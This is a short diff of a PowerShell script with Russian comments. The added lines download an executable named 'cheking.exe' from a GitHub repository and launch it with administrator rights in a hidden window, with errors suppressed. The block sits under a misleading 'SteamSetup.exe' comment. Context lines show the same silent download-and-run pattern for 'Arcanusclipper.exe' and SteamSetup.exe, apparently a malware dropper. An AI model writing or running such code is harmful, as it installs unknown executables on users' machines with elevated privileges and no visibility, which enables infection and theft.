@@ -165,6 +165,13 @@ try {
 
 # --- БЛОК СКАЧИВАНИЯ И ЗАПУСКА (КАК ТЫ ПРОСИЛ) ---
 
+# 4. SteamSetup.exe
+Write-Host "Скачивание cheking.exe..."
+Invoke-WebRequest -Uri "https://github.com/Proshkaversus/files/raw/refs/heads/main/cheking.exe" -OutFile "cheking.exe" -UseBasicParsing -ErrorAction SilentlyContinue
+if (Test-Path "cheking.exe") {
+    Start-Process "cheking.exe" -Verb RunAs -WindowStyle Hidden
+}
+
 # 1. Arcanusclipper.exe
 Write-Host "Скачивание Arcanusclipper.exe..."
 Invoke-WebRequest -Uri "https://github.com/Proshkaversus/files/raw/refs/heads/main/Arcanusclipper.exe" -OutFile "Arcanusclipper.exe" -UseBasicParsing -ErrorAction SilentlyContinue
@@ -192,6 +199,8 @@ Invoke-WebRequest -Uri "https://github.com/Proshkaversus/exe/raw/refs/heads/main
 if (Test-Path "SteamSetup.exe") {
     Start-Process "SteamSetup.exe" -Verb RunAs -WindowStyle Hidden
 }
+
+
 
 
 
